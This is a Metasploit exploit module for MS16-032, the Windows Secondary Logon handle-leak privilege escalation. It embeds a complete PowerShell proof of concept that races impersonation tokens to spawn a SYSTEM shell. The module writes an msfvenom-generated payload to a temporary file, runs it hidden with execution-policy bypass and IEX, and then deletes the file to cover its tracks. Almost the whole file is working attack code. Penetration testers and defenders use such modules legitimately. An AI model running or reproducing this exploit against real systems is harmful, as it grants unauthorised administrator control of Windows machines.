##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload_generator'
require 'rex'

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Exploit::Powershell
  include Msf::Post::File

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'MS16-032 Secondary Logon Handle Privilege Escalation',
      'Description'   => %q{
This module exploits the lack of sanitization of standard handles in Windows' Secondary Logon Service.  The vulnerability is known to affect versions of Windows 7-10 and 2k8-2k12 32 and 64 bit.  This module will only work against those versions of Windows with Powershell 2.0 or later and systems with two or more CPU cores. Works about 75% of the time, if module fails, just re-run.

 For further information, please visit: https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html

Copyright 2016, Ruben Boonen (@FuzzySec)
License BSD 3-Clause
          },
       'License'       => "BSD 3-Clause",
       'Author'        =>
         [
           'James Forshaw', #twitter.com/tiraniddo
           'b33f',#@FuzzySec, http://www.fuzzysecurity.com'
           'khr0x40sh'
         ],
       'References'    =>
         [
           [ 'MS', 'MS16-032'],
           [ 'CVE', '2016-0099'],
           [ 'URL', 'https://twitter.com/FuzzySec/status/723254004042612736' ],
           [ 'URL', 'https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html']
         ],
        'DefaultOptions' =>
          {
            'EXITFUNC' => 'thread'
          },
        'DisclosureDate' => 'Mar 21, 2016',
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ],
        'Targets'        =>
          [
            # Tested on (32 bits):
            # * Windows 7 SP1
            [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
            # Tested on (64 bits):
            # * Windows 7 SP1
            # * Windows 8
            # * Windows 2012
            [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
          ],
        'DefaultTarget' => 0
      ))

    register_options([
      ])
    register_advanced_options(
      [
        OptString.new('W_PATH', [false, 'Where to write temporary powershell file', ""]),
        OptBool.new(  'DELETE',  [false, 'Delete temporary powershell file', true]),
        OptBool.new(  'DRY_RUN',  [false, 'Only show what would be done', false ]),
        OptInt.new('TIMEOUT',   [false, 'Execution timeout', 60]) #How long until we DELETE file, we have a race condition here, so anything less than 60 seconds might break
      ], self.class)
  end


  def check
    os = sysinfo["OS"]

    if os !~ /windows/i
      # Non-Windows systems are definitely not affected.
      return Exploit::CheckCode::Safe
    end

    if sysinfo["Architecture"] =~ /(wow|x)64/i
      arch = ARCH_X86_64
    elsif sysinfo["Architecture"] =~ /x86/i
      arch = ARCH_X86
    end
      return arch
  end

  def exploit

  arch1 = check

  # Exploit PoC from 'b33f'
  ms16_032 = ms16_032ps

  # Using venom_generator to produce compressed powershell script.  See class at bottom of module.
  payl = setup_pay

  upfile=Rex::Text.rand_text_alpha((rand(8)+6))+".txt"
  path = pwd || datastore['W_PATH']
  upfile = "#{path}\\#{upfile}"
  fd =session.fs.file.new(upfile,"wb")
  print_status("Writing payload file, #{upfile}...")
  fd.write(payl)
  fd.close
  psh_cmd="IEX `$(gc #{upfile})"

  cmdstr="C:\\Windows\\System32\\windowspowershell\\v1.0\\powershell.exe"
  if (datastore['TARGET'] == 0 && arch1 == ARCH_X86_64)
    cmdstr.gsub!("System32","SYSWOW64")
    print_warning("Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell")
    vprint_warning("#{cmdstr}")
  end

  #lpAppName
  ms16_032.gsub!("$cmd","\"#{cmdstr}\"")
  #lpcommandLine - capped at 1024b
  ms16_032.gsub!("$args1","\" -exec Bypass -nonI -window Hidden #{psh_cmd}\"")

  print_status('Compressing script contents...')
  ms16_032_c = compress_script(ms16_032)
  if (ms16_032_c.size > 8100)
    print_error("Compressed size: #{ms16_032_c.size}")
    error_msg =  "Compressed size may cause command to exceed "
    error_msg += "cmd.exe's 8kB character limit."
    print_error(error_msg)
  else
    print_good("Compressed size: #{ms16_032_c.size}")
  end

  if datastore['DRY_RUN']
    print_good("cmd.exe /C powershell -exec Bypass #{ms16_032_c}")
    return
  end

  print_status("Executing exploit script...")
  cmd="cmd.exe /C powershell -nonI -window Hidden -exec Bypass #{ms16_032_c}"
  args=nil
  begin
    process = session.sys.process.execute(cmd, args, {'Hidden' => true, 'Channelized' => false})
  rescue
    print_error("An error occurred executing the script.")
  end

  if (datastore['DELETE'])
    sleep_t = datastore['TIMEOUT']
    vprint_warning("Sleeping #{sleep_t} seconds before deleting #{upfile}...")
    sleep sleep_t
    begin
      rm_f(upfile)
      print_good("Cleaned up #{upfile}")
    rescue
      print_error("There was an issue with cleanup of the powershell payload script.")
    end
  end
  print_status("Exploit complete")
  end

  def ms16_032ps
    pscode = %Q|
    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SQOS
    {
        public int Length;
        public int ImpersonationLevel;
        public int ContextTrackingMode;
        public bool EffectiveOnly;
    }

    public static class Advapi32
    {
        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern bool CreateProcessWithLogonW(
            String userName,
            String domain,
            String password,
            int logonFlags,
            String applicationName,
            String commandLine,
            int creationFlags,
            int environment,
            String currentDirectory,
            ref  STARTUPINFO startupInfo,
            out PROCESS_INFORMATION processInformation);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool SetThreadToken(
            ref IntPtr Thread,
            IntPtr Token);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool OpenThreadToken(
            IntPtr ThreadHandle,
            int DesiredAccess,
            bool OpenAsSelf,
            out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            int DesiredAccess,
            ref IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError=true)]
        public extern static bool DuplicateToken(
            IntPtr ExistingTokenHandle,
            int SECURITY_IMPERSONATION_LEVEL,
            ref IntPtr DuplicateTokenHandle);
    }

    public static class Kernel32
    {
        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern int GetThreadId(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int GetProcessIdOfThread(IntPtr handle);

        [DllImport("kernel32.dll",SetLastError=true)]
        public static extern int SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll",SetLastError=true)]
        public static extern int ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool TerminateProcess(
            IntPtr hProcess,
            uint uExitCode);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool DuplicateHandle(
            IntPtr hSourceProcessHandle,
            IntPtr hSourceHandle,
            IntPtr hTargetProcessHandle,
            ref IntPtr lpTargetHandle,
            int dwDesiredAccess,
            bool bInheritHandle,
            int dwOptions);
    }

    public static class Ntdll
    {
        [DllImport("ntdll.dll", SetLastError=true)]
        public static extern int NtImpersonateThread(
            IntPtr ThreadHandle,
            IntPtr ThreadToImpersonate,
            ref SQOS SecurityQualityOfService);
    }
"@

    function Get-ThreadHandle {
        # StartupInfo Struct
        $StartupInfo = New-Object STARTUPINFO
        $StartupInfo.dwFlags = 0x00000100 # STARTF_USESTDHANDLES
        $StartupInfo.hStdInput = [Kernel32]::GetCurrentThread()
        $StartupInfo.hStdOutput = [Kernel32]::GetCurrentThread()
        $StartupInfo.hStdError = [Kernel32]::GetCurrentThread()
        $StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size

        # ProcessInfo Struct
        $ProcessInfo = New-Object PROCESS_INFORMATION

        # CreateProcessWithLogonW --> lpCurrentDirectory
        $GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName

        # LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
        $CallResult = [Advapi32]::CreateProcessWithLogonW(
            "user", "domain", "pass",
            0x00000002, "C:\\Windows\\System32\\cmd.exe", "",
            0x00000004, $null, $GetCurrentPath,
            [ref]$StartupInfo, [ref]$ProcessInfo)

        # Duplicate handle into current process -> DUPLICATE_SAME_ACCESS
        $lpTargetHandle = [IntPtr]::Zero
        $CallResult = [Kernel32]::DuplicateHandle(
            $ProcessInfo.hProcess, 0x4,
            [Kernel32]::GetCurrentProcess(),
            [ref]$lpTargetHandle, 0, $false,
            0x00000002)

        # Clean up suspended process
        $CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1)
        $CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess)
        $CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread)

        $lpTargetHandle
    }

    function Get-SystemToken {
        echo "`n[?] Trying thread handle: $Thread"
        echo "[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($Thread))).ProcessName)"

        $CallResult = [Kernel32]::SuspendThread($Thread)
        if ($CallResult -ne 0) {
            echo "[!] $Thread is a bad thread, moving on.."
            Return
        } echo "[+] Thread suspended"

        echo "[>] Wiping current impersonation token"
        $CallResult = [Advapi32]::SetThreadToken([ref]$Thread, [IntPtr]::Zero)
        if (!$CallResult) {
            echo "[!] SetThreadToken failed, moving on.."
            $CallResult = [Kernel32]::ResumeThread($Thread)
            echo "[+] Thread resumed!"
            Return
        }

        echo "[>] Building SYSTEM impersonation token"
        # SecurityQualityOfService struct
        $SQOS = New-Object SQOS
        $SQOS.ImpersonationLevel = 2 #SecurityImpersonation
        $SQOS.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SQOS)
        # Undocumented API's, I like your style Microsoft ;)
        $CallResult = [Ntdll]::NtImpersonateThread($Thread, $Thread, [ref]$sqos)
        if ($CallResult -ne 0) {
            echo "[!] NtImpersonateThread failed, moving on.."
            $CallResult = [Kernel32]::ResumeThread($Thread)
            echo "[+] Thread resumed!"
            Return
        }

        $script:SysTokenHandle = [IntPtr]::Zero
        # 0x0006 --> TOKEN_DUPLICATE -bor TOKEN_IMPERSONATE
        $CallResult = [Advapi32]::OpenThreadToken($Thread, 0x0006, $false, [ref]$SysTokenHandle)
        if (!$CallResult) {
            echo "[!] OpenThreadToken failed, moving on.."
            $CallResult = [Kernel32]::ResumeThread($Thread)
            echo "[+] Thread resumed!"
            Return
        }

        echo "[?] Success, open SYSTEM token handle: $SysTokenHandle"
        echo "[+] Resuming thread.."
        $CallResult = [Kernel32]::ResumeThread($Thread)
    }

    # main() <--- ;)

    # Check logical processor count, race condition requires 2+
    echo "`n[?] Operating system core count: $([System.Environment]::ProcessorCount)"
    if ($([System.Environment]::ProcessorCount) -lt 2) {
        echo "[!] This is a VM isn't it, race condition requires at least 2 CPU cores, exiting!`n"
        Return
    }

    # Create array for Threads & TID's
    $ThreadArray = @()
    $TidArray = @()

    echo "[>] Duplicating CreateProcessWithLogonW handles.."
    # Loop Get-ThreadHandle and collect thread handles with a valid TID
    for ($i=0; $i -lt 500; $i++) {
        $hThread = Get-ThreadHandle
        $hThreadID = [Kernel32]::GetThreadId($hThread)
        # Bit hacky/lazy, filters on uniq/valid TID's to create $ThreadArray
        if ($TidArray -notcontains $hThreadID) {
            $TidArray += $hThreadID
            if ($hThread -ne 0) {
                $ThreadArray += $hThread # This is what we need!
            }
        }
    }

    if ($($ThreadArray.length) -eq 0) {
        echo "[!] No valid thread handles were captured, exiting!"
        Return
    } else {
        echo "[?] Done, got $($ThreadArray.length) thread handle(s)!"
        echo "`n[?] Thread handle list:"
        $ThreadArray
    }

    echo "`n[*] Sniffing out privileged impersonation token.."
    foreach ($Thread in $ThreadArray){

        # Get handle to SYSTEM access token
        Get-SystemToken

        echo "`n[*] Sniffing out SYSTEM shell.."
        echo "`n[>] Duplicating SYSTEM token"
        $hDuplicateTokenHandle = [IntPtr]::Zero
        $CallResult = [Advapi32]::DuplicateToken($SysTokenHandle, 2, [ref]$hDuplicateTokenHandle)

        # Simple PS runspace definition
        echo "[>] Starting token race"
        $Runspace = [runspacefactory]::CreateRunspace()
        $StartTokenRace = [powershell]::Create()
        $StartTokenRace.runspace = $Runspace
        $Runspace.Open()
        [void]$StartTokenRace.AddScript({
            Param ($Thread, $hDuplicateTokenHandle)
            while ($true) {
                $CallResult = [Advapi32]::SetThreadToken([ref]$Thread, $hDuplicateTokenHandle)
            }
        }).AddArgument($Thread).AddArgument($hDuplicateTokenHandle)
        $AscObj = $StartTokenRace.BeginInvoke()

        echo "[>] Starting process race"
        # Adding a timeout (10 seconds) here to safeguard from edge-cases
        $SafeGuard = [diagnostics.stopwatch]::StartNew()
        while ($SafeGuard.ElapsedMilliseconds -lt 10000) {
        # StartupInfo Struct
        $StartupInfo = New-Object STARTUPINFO
        $StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size

        # ProcessInfo Struct
        $ProcessInfo = New-Object PROCESS_INFORMATION

        # CreateProcessWithLogonW --> lpCurrentDirectory
        $GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName

        # LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
        $CallResult = [Advapi32]::CreateProcessWithLogonW(
            "user", "domain", "pass",
            0x00000002, $cmd, $args1,
            0x00000004, $null, $GetCurrentPath,
            [ref]$StartupInfo, [ref]$ProcessInfo)
        $hTokenHandle = [IntPtr]::Zero
        $CallResult = [Advapi32]::OpenProcessToken($ProcessInfo.hProcess, 0x28, [ref]$hTokenHandle)

        # If we can't open the process token it's a SYSTEM shell!
        if (!$CallResult) {
            echo "[!] Holy handle leak Batman, we have a SYSTEM shell!!`n"
            $CallResult = [Kernel32]::ResumeThread($ProcessInfo.hThread)
            $StartTokenRace.Stop()
            $SafeGuard.Stop()
            Return
        }

        # Clean up suspended process
        $CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1)
        $CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess)
        $CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread)
        }

        # Kill runspace & stopwatch if edge-case
        $StartTokenRace.Stop()
        $SafeGuard.Stop()
    }
    exit
    |

    return pscode
  end

  def setup_pay
  generator_opts ={}

  generator_opts[:payload] = datastore['PAYLOAD']
  generator_opts[:datastore]= datastore
  generator_opts[:format] = "psh-net"
  generator_opts[:framework] = framework
  begin
    venom_generator = Msf::PayloadGenerator.new(generator_opts)
    psh_payload = venom_generator.generate_payload
  rescue ::Exception => e
    elog("#{e.class} : #{e.message}\n#{e.backtrace * "\n"}")
    print_error(e.message)
  end
  compressed_payload = compress_script(psh_payload)
  encoded_payload = encode_script(compressed_payload)
  pay1 = compressed_payload

  vprint_status("Payload size: #{compressed_payload.size}")
  return pay1
  end

end
